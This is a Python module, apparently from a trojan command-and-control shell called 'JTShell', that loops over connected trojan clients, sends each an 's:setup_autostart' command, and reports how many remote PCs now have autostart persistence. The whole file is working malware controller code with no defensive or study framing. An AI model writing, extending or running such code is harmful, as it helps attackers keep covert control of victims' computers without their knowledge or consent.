__author__ = 'Jonas'
from scriptshell import ScriptShell
from util import shellprint
from util import trojanrecv
from JTShell.util.error import ProcessError
from JTShell.util.message import Message
import time


def run(process):
    shell = process.shell
    if isinstance(shell, ScriptShell):
        # itering trough the connected trojans executing the script on each of them then waiting for their individual
        # comments and returns
        successfull_implementations = 0
        for trojanconnection in shell.trojanregister:
            trojanconnection.activate()
            time.sleep(0.1)
            trojanconnection.send("s:setup_autostart")
            message_type = trojanrecv(process, trojanconnection)
            if message_type == "error":
                shellprint(process, Message("error", "{0}: failed to implement autostart".format(trojanconnection.ip)))
            else:
                shellprint(process, Message("result", "{0}: successfully implemented autostart".format(trojanconnection.ip)))
                successfull_implementations += 1
            trojanconnection.deactivate()
        if successfull_implementations == 0:
            raise ProcessError("failed to implement any autostart protocols")
        elif successfull_implementations >= 1:
            return "implemented autostart behaviour on {0} remote pcs".format(successfull_implementations)
